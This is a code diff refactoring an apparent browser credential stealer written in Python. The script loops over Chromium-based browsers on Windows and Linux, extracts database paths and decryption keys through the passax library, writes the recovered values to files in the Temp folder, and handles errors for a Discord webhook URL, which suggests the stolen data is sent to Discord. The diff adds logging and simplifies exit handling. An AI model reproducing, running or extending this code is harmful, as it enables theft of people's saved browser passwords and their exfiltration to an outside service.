@@ -6,12 +6,19 @@ import sys
 from os.path import join
 
 import requests.exceptions
-from discord_webhook import DiscordWebhook
 from requests import get
+from discord_webhook import DiscordWebhook
+from passax import chrome
 
-import chrome_based
-import logger
-from exceptions import Exit
+# Setup
+# Need to import this to the main file
+# Add logging.StreamHandler() to print to console
+handlers = [logging.FileHandler('app.log')]
+logging.basicConfig(
+    format="%(asctime)s - %(levelname)s : %(message)s",
+    level=logging.INFO,
+    datefmt='%d-%b-%y %H:%M:%S',
+    handlers=handlers)
 
 # Get the temp path for every system
 TEMP_PATH = r"C:\Users\{}\AppData\Local\Temp".format(
@@ -39,14 +46,14 @@ def main():
     )
 
     # Iterate through the handled browsers
-    for browser_name in chrome_based.handled_browsers:
+    for browser_name in chrome.available_browsers:
         print(f"- {browser_name.capitalize()}")
         logging.info(browser_name.capitalize())
 
         try:
             filename = join(TEMP_PATH, f"{browser_name}.txt")
             if platform.system() == "Windows":
-                win = chrome_based.ChromeWindows(browser_name)
+                win = chrome.ChromeWindows(browser_name)
                 logging.info("Getting database paths and keys for Windows...")
                 win.get_windows()
                 logging.info("Fetching database values...")
@@ -55,7 +62,7 @@ def main():
                 logging.info(f"File saved to: {filename}")
 
             elif platform.system() == "Linux":
-                lin = chrome_based.ChromeLinux(browser_name)
+                lin = chrome.ChromeLinux(browser_name)
                 logging.info("Getting database paths and keys for Linux...")
                 lin.get_linux()
                 logging.info("Fetching database values...")
@@ -66,7 +73,7 @@ def main():
             else:
                 print("MacOS is not supported")
                 logging.error("MacOS is not supported!")
-                raise Exit(Exit.OS_NOT_SUPPORTED)
+                sys.exit(-1)
 
         except Exception as E:
             print(f"\nSkipping {browser_name.capitalize()}\n")
@@ -91,11 +98,11 @@ def main():
     except requests.exceptions.MissingSchema:
         logging.error("Invalid Discord Hook URL")
         print("\nInvalid Discord Hook URL. Exiting...")
-        sys.exit(Exit.INVALID_HOOK_URL)
+        sys.exit(-1)
 
 
 if __name__ == '__main__':
     try:
         main()
     except KeyboardInterrupt:
-        raise Exit(Exit.KEYBOARD_INTERRUPT)
+        sys.exit(-1)
